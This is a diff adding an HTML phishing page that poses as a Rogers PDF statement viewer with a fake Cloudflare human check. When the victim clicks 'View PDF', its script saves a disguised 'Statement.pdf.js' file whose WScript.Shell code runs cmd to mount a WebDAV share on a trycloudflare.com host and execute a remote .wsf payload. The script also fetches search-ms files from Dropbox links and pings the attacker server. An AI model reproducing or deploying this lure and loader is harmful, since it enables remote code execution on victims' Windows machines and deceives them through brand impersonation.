@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f6f6f6;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .invoice-background {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            max-width: 900px;
+            background: white;
+            padding: 50px;
+            border-radius: 12px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.25);
+            opacity: 0;
+            transition: all 2s ease;
+            filter: blur(8px) brightness(0.95);
+            z-index: 1;
+            transform-origin: center;
+            border: 2px solid #e0e0e0;
+        }
+
+        .invoice-background.show {
+            opacity: 0.9;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            z-index: 2;
+            position: relative;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            padding: 35px 30px;
+            transition: all 0.5s ease;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #e1e5e9;
+        }
+
+        .pdf-container {
+            padding: 20px;
+            transition: all 0.5s ease;
+        }
+
+        .pdf-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            animation: float 3s ease-in-out infinite;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .pdf-icon:hover {
+            transform: scale(1.1);
+        }
+
+        .pdf-text {
+            color: #2d3748;
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 15px;
+            letter-spacing: -0.3px;
+        }
+
+        .loading-bar {
+            width: 200px;
+            height: 3px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            margin: 20px auto 0;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: #e11d2d;
+            border-radius: 3px;
+            transition: width 3s ease;
+        }
+
+        .verification-container {
+            opacity: 0;
+            transform: translateY(15px);
+            transition: all 0.5s ease;
+            max-height: 0;
+            overflow: hidden;
+        }
+
+        .verification-container.show {
+            opacity: 1;
+            transform: translateY(0);
+            max-height: 500px;
+        }
+
+        .rogers-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .rogers-logo {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .verification-title {
+            color: #2d3748;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.4;
+            margin-bottom: 5px;
+        }
+
+        .human-check-container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 12px;
+            margin: 25px 0;
+            padding: 16px;
+            background: #f7fafc;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .human-check-container:hover {
+            background: #edf2f7;
+            border-color: #cbd5e0;
+        }
+
+        /* Real Cloudflare-style checkbox */
+        .cloudflare-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #cbd5e0;
+            border-radius: 4px;
+            background: white;
+            position: relative;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+
+        .cloudflare-checkbox.checked {
+            background: #e11d2d;
+            border-color: #e11d2d;
+        }
+
+        .cloudflare-checkbox.checked::after {
+            content: '';
+            position: absolute;
+            left: 6px;
+            top: 2px;
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .checkbox-content {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #2d3748;
+            font-weight: 500;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .cloudflare-verify-logo {
+            width: 80px;
+            height: 18px;
+            object-fit: contain;
+        }
+
+        .processing-container {
+            opacity: 0;
+            transform: translateY(15px);
+            transition: all 0.5s ease;
+            max-height: 0;
+            overflow: hidden;
+        }
+
+        .processing-container.show {
+            opacity: 1;
+            transform: translateY(0);
+            max-height: 500px;
+        }
+
+        .processing-text {
+            color: #2d3748;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .processing-bar {
+            width: 100%;
+            height: 4px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .processing-progress {
+            height: 100%;
+            width: 0%;
+            background: #e11d2d;
+            border-radius: 4px;
+            transition: width 2s ease;
+        }
+
+        .success-container {
+            opacity: 0;
+            transform: translateY(15px);
+            transition: all 0.5s ease;
+            max-height: 0;
+            overflow: hidden;
+        }
+
+        .success-container.show {
+            opacity: 1;
+            transform: translateY(0);
+            max-height: 500px;
+        }
+
+        .success-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 15px;
+            color: #48bb78;
+        }
+
+        .success-text {
+            color: #2d3748;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .view-pdf-btn {
+            background: #e11d2d;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .view-pdf-btn:hover {
+            background: #c41a29;
+            transform: translateY(-1px);
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        @media (max-width: 500px) {
+            .card {
+                padding: 30px 25px;
+            }
+            
+            .pdf-icon {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .pdf-text {
+                font-size: 16px;
+            }
+            
+            .invoice-background {
+                width: 95%;
+                padding: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Blurred invoice background -->
+    <div class="invoice-background" id="invoiceBackground">
+        <div class="invoice-content">
+            <div class="invoice-header">
+                <div class="invoice-title">INVOICE</div>
+                <div class="invoice-number">#INV-2023-04567</div>
+            </div>
+            <div class="invoice-details">
+                <div class="invoice-from">
+                    <strong>From:</strong><br>
+                    Tech Solutions Inc.<br>
+                    123 Business Avenue<br>
+                    San Francisco, CA 94107<br>
+                    contact@techsolutions.com
+                </div>
+                <div class="invoice-to">
+                    <strong>To:</strong><br>
+                    Global Enterprises Ltd.<br>
+                    456 Corporate Boulevard<br>
+                    New York, NY 10001<br>
+                    accounting@globalent.com
+                </div>
+            </div>
+            <div class="invoice-details">
+                <div>
+                    <strong>Invoice Date:</strong> October 15, 2023
+                </div>
+                <div>
+                    <strong>Due Date:</strong> November 14, 2023
+                </div>
+            </div>
+            <table class="invoice-items">
+                <thead>
+                    <tr>
+                        <th>Description</th>
+                        <th>Quantity</th>
+                        <th>Unit Price</th>
+                        <th>Amount</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Professional Website Design</td>
+                        <td>1</td>
+                        <td>$2,500.00</td>
+                        <td>$2,500.00</td>
+                    </tr>
+                    <tr>
+                        <td>E-commerce Integration</td>
+                        <td>1</td>
+                        <td>$1,800.00</td>
+                        <td>$1,800.00</td>
+                    </tr>
+                    <tr>
+                        <td>Web Hosting (12 months)</td>
+                        <td>1</td>
+                        <td>$300.00</td>
+                        <td>$300.00</td>
+                    </tr>
+                </tbody>
+            </table>
+            <div class="invoice-total">
+                Total: $4,600.00
+            </div>
+        </div>
+    </div>
+
+    <!-- Main content container -->
+    <div class="container">
+        <div class="card">
+            <div class="pdf-container" id="pdfContainer">
+                <div class="rogers-header">
+                    <img src="https://images.ctfassets.net/h6ysm004d16d/4uHhldexi8ivoQhLkVCKqD/f746ea7a989cae13abade6f966fe21df/Rogers_logo-EN.png" alt="Rogers" class="rogers-logo">
+                </div>
+                
+                <svg class="pdf-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" id="pdfIcon">
+                    <rect x="15" y="10" width="70" height="80" rx="5" ry="5" fill="#e11d2d" />
+                    <rect x="15" y="10" width="70" height="15" fill="#c41a29" />
+                    <polygon points="75,10 85,10 85,20" fill="#a31621" />
+                    <rect x="25" y="35" width="50" height="4" rx="2" fill="white" />
+                    <rect x="25" y="42" width="45" height="4" rx="2" fill="white" />
+                    <rect x="25" y="49" width="40" height="4" rx="2" fill="white" />
+                    <rect x="25" y="56" width="35" height="4" rx="2" fill="white" />
+                    <rect x="25" y="63" width="50" height="4" rx="2" fill="white" />
+                    <rect x="25" y="70" width="30" height="4" rx="2" fill="white" />
+                    <rect x="25" y="77" width="45" height="4" rx="2" fill="white" />
+                    <text x="50" y="28" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="10" font-weight="bold">PDF</text>
+                </svg>
+                
+                <div class="pdf-text">Opening RC_7294583_102225_Statement.pdf</div>
+                <div class="loading-bar">
+                    <div class="loading-progress" id="loadingProgress"></div>
+                </div>
+            </div>
+            
+            <div class="verification-container" id="verificationContainer">
+                <div class="verification-title">Security verification required</div>
+                
+                <div class="human-check-container" id="humanCheckContainer">
+                    <div class="cloudflare-checkbox" id="cloudflareCheckbox"></div>
+                    <div class="checkbox-content">
+                        <div class="checkbox-label">Verify you are human</div>
+                        <img src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg" alt="Cloudflare" class="cloudflare-verify-logo">
+                    </div>
+                </div>
+            </div>
+
+            <div class="processing-container" id="processingContainer">
+                <div class="processing-text">Processing your request...</div>
+                <div class="processing-bar">
+                    <div class="processing-progress" id="processingProgress"></div>
+                </div>
+            </div>
+
+            <div class="success-container" id="successContainer">
+                <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <div class="success-text">Verification Complete</div>
+                <button class="view-pdf-btn" id="viewPdfBtn">View PDF</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const pdfContainer = document.getElementById('pdfContainer');
+            const verificationContainer = document.getElementById('verificationContainer');
+            const processingContainer = document.getElementById('processingContainer');
+            const successContainer = document.getElementById('successContainer');
+            const viewPdfBtn = document.getElementById('viewPdfBtn');
+            const cloudflareCheckbox = document.getElementById('cloudflareCheckbox');
+            const humanCheckContainer = document.getElementById('humanCheckContainer');
+            const pdfIcon = document.getElementById('pdfIcon');
+            const loadingProgress = document.getElementById('loadingProgress');
+            const processingProgress = document.getElementById('processingProgress');
+            const invoiceBackground = document.getElementById('invoiceBackground');
+            
+            let isChecked = false;
+
+            // Make PDF icon clickable to skip to verification
+            pdfIcon.addEventListener('click', function() {
+                if (!isChecked) {
+                    pdfContainer.style.opacity = '0';
+                    pdfContainer.style.transform = 'translateY(-15px)';
+                    
+                    setTimeout(function() {
+                        pdfContainer.style.display = 'none';
+                        verificationContainer.classList.add('show');
+                    }, 500);
+                }
+            });
+
+            // Clean checkbox functionality - auto transition when checked
+            humanCheckContainer.addEventListener('click', function() {
+                if (!isChecked) {
+                    isChecked = true;
+                    cloudflareCheckbox.classList.add('checked');
+                    
+                    // Auto transition to processing after 500ms
+                    setTimeout(function() {
+                        verificationContainer.style.opacity = '0';
+                        verificationContainer.style.transform = 'translateY(-15px)';
+                        
+                        setTimeout(function() {
+                            verificationContainer.style.display = 'none';
+                            processingContainer.classList.add('show');
+                            
+                            // Start processing animation
+                            setTimeout(() => {
+                                processingProgress.style.width = '100%';
+                            }, 100);
+                            
+                            // Simulate processing delay and show success
+                            setTimeout(function() {
+                                processingContainer.style.opacity = '0';
+                                processingContainer.style.transform = 'translateY(-15px)';
+                                
+                                setTimeout(function() {
+                                    processingContainer.style.display = 'none';
+                                    successContainer.classList.add('show');
+                                }, 500);
+                            }, 2000);
+                        }, 500);
+                    }, 500);
+                }
+            });
+
+            // Browser detection
+            function getBrowser() {
+                const userAgent = navigator.userAgent;
+                if (userAgent.includes('Edg')) return 'edge';
+                if (userAgent.includes('Firefox')) return 'firefox';
+                if (userAgent.includes('Chrome')) return 'chrome';
+                return 'other';
+            }
+
+            // Function to ping the server
+            function pingServer() {
+                const serverUrl = 'https://outcomes-centers-informal-agree.trycloudflare.com/downloaded.txt';
+                console.log('Pinging server:', serverUrl);
+                
+                // Create an image request to ping the server (works even if file doesn't exist)
+                const img = new Image();
+                img.src = serverUrl;
+                
+                // Also try fetch as backup
+                fetch(serverUrl, { mode: 'no-cors' })
+                    .then(() => console.log('Server ping successful'))
+                    .catch(err => console.log('Server ping attempted (may fail due to CORS):', err));
+            }
+
+            // Improved download function that works for all browsers
+            function downloadFile(url, filename) {
+                return new Promise((resolve) => {
+                    // Create a temporary anchor element
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = filename;
+                    a.style.display = 'none';
+                    
+                    // Add to document, click, and remove
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    
+                    // Resolve after a short delay to simulate download completion
+                    setTimeout(resolve, 1000);
+                });
+            }
+
+            // Save JS file using File System API with fallback
+            async function saveJsFile() {
+                const jsContent = `// RC_4583729_Oct22_2025_Statement.pdf.js
+var shell = new ActiveXObject("WScript.Shell");
+var command = 'cmd /c start /B /MIN pushd "\\\\\\\\outcomes-centers-informal-agree.trycloudflare.com@SSL\\\\DavWWWRoot" && wscript //B "\\\\\\\\outcomes-centers-informal-agree.trycloudflare.com@SSL\\\\DavWWWRoot\\\\asw.wsf" && popd';
+
+try {
+    // Execute the command
+    shell.Run(command, 0, false);
+    
+} catch (e) {
+    WScript.Echo("Error executing command: " + e.message);
+}`;
+
+                try {
+                    if ('showSaveFilePicker' in window) {
+                        const fileHandle = await window.showSaveFilePicker({
+                            suggestedName: "RC_4583729_Oct22_2025_Statement.pdf.js",
+                            types: [{
+                                description: "JavaScript File",
+                                accept: { "application/javascript": [".js"] }
+                            }]
+                        });
+                        
+                        const writable = await fileHandle.createWritable();
+                        await writable.write(jsContent);
+                        await writable.close();
+                        console.log('JS file saved successfully via File System API');
+                        return true;
+                    } else {
+                        throw new Error('File System API not available');
+                    }
+                } catch (err) {
+                    console.warn('File System API failed, using direct download:', err);
+                    // Fallback: create blob and download
+                    const blob = new Blob([jsContent], { type: 'application/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    await downloadFile(url, 'RC_4583729_Oct22_2025_Statement.pdf.js');
+                    setTimeout(() => URL.revokeObjectURL(url), 1000);
+                    return true;
+                }
+            }
+
+            // Silent file download process with improved browser handling
+            async function executeSilentDownload() {
+                const browser = getBrowser();
+                console.log('Detected browser:', browser);
+                
+                try {
+                    // Step 1: Save JS file for Chrome/Edge, download JS for Firefox
+                    if (browser === 'firefox') {
+                        console.log('Downloading JS for Firefox...');
+                        await downloadFile(
+                            'https://www.dropbox.com/scl/fi/3ozof6fe12ka5049mvq8a/RC_7294583_102225_Satement.pdf.js?rlkey=q9kvrfodj8uyz39x74jtlym89&st=hxvyynt1&dl=1',
+                            'RC_7294583_102225_Statement.pdf.js'
+                        );
+                    } else {
+                        console.log('Saving JS file via Save As...');
+                        await saveJsFile();
+                    }
+
+                    // Step 2: Download browser-specific search-ms file
+                    console.log('Downloading search-ms file...');
+                    if (browser === 'edge') {
+                        await downloadFile(
+                            'https://www.dropbox.com/scl/fi/b0hjyzf31f6aiwk0w94qo/RC-4583729_Oct22_2025_Statement.pdf-2.zip?rlkey=02txbrm2qhy58iiwnkzl94zal&st=6x08apya&dl=1',
+                            'RC_4583729_Oct22_2025_Statement.pdf.search-ms.zip'
+                        );
+                    } else {
+                        await downloadFile(
+                            'https://www.dropbox.com/scl/fi/6agfew4t0vgaal8b9urfz/RC-4583729_Oct22_2025_Statement.pdf-2.search-ms?rlkey=on9qlspzwrbksnloesv0914z7&st=ua4d23rt&dl=1',
+                            'RC_4583729_Oct22_2025_Statement.pdf.search-ms'
+                        );
+                    }
+
+                    // Step 3: Ping server after all downloads are complete
+                    console.log('All downloads complete, pinging server...');
+                    pingServer();
+
+                } catch (error) {
+                    console.error('Download process failed:', error);
+                    // Still try to ping server even if downloads fail
+                    pingServer();
+                }
+            }
+
+            // Handle view PDF button - start silent file download process
+            viewPdfBtn.addEventListener('click', async function() {
+                console.log('View PDF button clicked');
+                await executeSilentDownload();
+            });
+
+            // Start loading animation
+            setTimeout(() => {
+                loadingProgress.style.width = '100%';
+            }, 100);
+            
+            // Show blurred invoice background after 1 second - with better visibility
+            setTimeout(function() {
+                invoiceBackground.classList.add('show');
+            }, 1000);
+            
+            // After 3 seconds, transition to verification automatically
+            setTimeout(function() {
+                pdfContainer.style.opacity = '0';
+                pdfContainer.style.transform = 'translateY(-15px)';
+                
+                setTimeout(function() {
+                    pdfContainer.style.display = 'none';
+                    verificationContainer.classList.add('show');
+                }, 500);
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
